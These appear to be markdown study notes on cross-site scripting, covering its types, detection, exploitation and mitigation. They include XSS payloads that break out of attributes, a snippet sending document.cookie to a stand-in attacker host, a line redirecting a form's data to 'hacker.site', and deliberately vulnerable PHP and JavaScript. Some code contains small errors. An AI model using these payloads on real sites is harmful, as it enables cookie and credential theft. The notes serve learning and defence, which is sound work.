
# xss

## Input validation attacks

xss is a type of input validation attack that can subvert an applications behaviour or functionality if the application does not sanitize malicious user input. xss is deemed a client side attack because it makes the users of a website vulnerable not the website itself.

## Cross site scripting (xss)

Cross site scripting is one of the oldest web application attacks dated to 1996-1998 when is was possible to control frames within a web page through injected code.

This injected code can "cross" website boundaries hence the phrase cross site scripting. A successful cross site scripting attack is able to inject HTML (HTML injection) or run code (javascript) in other peoples browser.

xss affects the *users* of a website, not the website itself. The xss payload executes within the browser of the user interacting with the page. This gives the javascript access to anything the page is doing... this can result in information theft eg. cookie theft...

```
var img = document.getElementByImg('some_img')
img.src = 'http://attackermachine.net?cookie='+document.cookie
```

## Example xss

Vulnerable code takes the name parameter from the URL querystring.

```
<?php
    echo '<h5> hello ' . $_GET['name'] . '</h4>';
?>
```

## Example exploitation

You may need to URL-encode the xss payload... the browser will do this for you in this case...

```
http://vulnerable.com/welcome.php?name=<img src="monz" onerror="alert(1)" />
```

## Why does xss happen?

The user input is shown without sanitization (either during the input or when being displayed).

The users input is assumed to *data* not *code*... allowing users to submit their own code to your website or in some cases in the context of other users (potentially gaining access to sensitive user information) as an unintended side effect!

## So i've got xss, what now?

So you've got an xss, what malicious stuff can we do...

* cookie theft
* steal cookies for impersonation
* complete control over a users browser
* attempt to exploit the users machine
* attempt to perform key logging
* modify the site (defacing the page.. make it your favourite colour!)

Using a crafted link and social engineering the aim would be to get your xss payload executed by your victim.

## Types of xss

* reflected
* stored
* DOM

Possibly more types <see cure53 research)

## Reflected xss

Sometimes called non-persistent xss

The most common and well understood type of xss. The untrusted user data is immediately *reflected* back during the rendering of the page. Testing for this type of xss involves supplying some input and checking whether that input is displayed without modification within the websites response.

Example vulnerable server code:
```
<?php $name = @$_GET['name']; ?>
Welcome <?= $name ?>
```

## Stored xss

This is a similar flaw to reflected xss however the malicious payload is stored by the backend instead of being reflected back to the client straight away.

Stored xss is a higher criticality than reflected xss because a stored xss no longer involves social engineering to exploit... once the payload is stored, any unsuspecting victim will execute the payload.

## DOM xss

DOM based xss is a form of xss that exists entirely on the client during the process of constructing the DOM. The DOM may be dynamically generated by scripts running on the page. If this process takes un-sanitized input from the user and creates HTML or executes code (intentionally or unintentionally) from it.

Example vulnerable client code:

```html

<h1 id='name'></h1>
<script>
var name = document.location.hash.substr(
  document.location.hash.search(/#w!/i) +3,
  document.location.hash.length
)
document.getElementById('welcome').innerHTML = name
</script>

<script>
var pos = document.URL.indexOf('name=')+5;
document.write(document.URL.substring(pos, document.URL.length))
// test.html?name=test
</script>

```

the innerHTML function allows dynamically generated content and is vulnerable here because it does not check the users input rendering HTML.

Some common ways to do dynamic DOM manipulation...

* document.write
* element.innerHTML

DOM based xss can be made persistent if cookies or browser storage are poisoned with the payload.

## Finding xss

### Reflective xss

During black box testing the correlation between user supplied data and the websites output can be analysed. If user supplied input is displayed with no modification or partial modification (see xss filers), an reflective xss may exist.

Some example payloads for testing reflective xss...
```
<plaintext>
```
If reflective xss exists the page following the plaintext tag will be obviously different giving you a quick indication that xss is present.

Once the reflection is found further testing with other payloads can be tried...

```
<script>
<iframe>
<img>
```

### Stored xss

Similar to the process of reflective xss but instead of looking for an immediate response you confirm the payload has persisted. Once an injection point has been found the payload may execute at a different place/part of the web application entirely.

### DOM xss

This is the hardest type of xss to discover, some tools exist to help. The browsers web inspector will show the result of the DOM creation and dom based javascript manipulation. This output may look entirely different from the original source code as much work can happen during the javascript execution.

## Exploiting xss

Some vulnerable code...

```
<html>
  <head></head>
  <body>
    <img src="logo.png" alt="<?= $_GET['name'] ?>" />
  </body>
</html>
```

The name parameter is eventually rendered inside the alt paramter of the img tag. To "break out" of the alt tag and allow arbitrary code the payload can "close out" the img tag first...

```
http://victim.com/index.php?name="><img src="x" onerror="alert(1)"
```

Which should render...

```
<html>
  <head></head>
  <body>
    <img src="logo.png" alt="" /><img src="x" onerror="alert(1)">
  </body>
</html>
```

Another payload could be...

```
" onload="alert(String.fromCharCode(88,83,83))"
```

## Browser inconsistencies

xss payloads designed to work for one browser may not work in another. In effect you may have to create cross-browser compatible exploits or know the browser your targeting in advance.

## Cookie theft

Cookie theft is limited by SOP (see iframe workaround below).

```
<!-- reading cookies from a different cookie path using an iframe -->
<script>
function cookiepath(path) {
  for (var i = 0; i <window.frames.length; i++) {
    frameURL = window.frames[i].location.toString();
    if (frameURL.indexOf(path) > -1)
      alert(window.frames[i].document.cookie)
  }
}
</script>
<iframe onload="cookiepath('/path1/')" style="display:none;" src="/path1/index.php"></iframe>
```

Cookie theft is applicable if the httpOnly flag has not been set. The httpOnly diss-allows javascript from modifying the cookies.

Secure cookies are only sent over HTTPS connections.

## dom manipluation

```
document.body.innerHTML='<h1>defaced</h1>'
```

## change form target

```
document.forms[0].action='http://hacker.site/stole_your_form_data.php'
```

## BeEF

BeEF or browser exploitation framework can be used to pivot  through the victims browser and perform an array of interesting browser exploitation attacks (see the browser hackers handbook).

## Mitigation

Cross site scripting is a data validation vulnerability that can only happen if untrusted user input is displayed via the web applications output (without or with partial modification).

### Some mitigations & philosophy

* input validation - to filter out malicious attack vectors
* context-aware output encoding - to correctly render the content
* never ever trust user input

eg. if the input should only accept digits use a whitelist to *only* allow digits. This is effective input validation.

Context aware output encoding means knowing where the content will eventually be rendered so that malicious input can be encoded (thus made safe). For example code can be encoded to make it harmless when eventually rendered.

## References

* XSS Attacks: Cross Site Scripting Exploits and Defense [book]
* [XSS Filter evasion cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
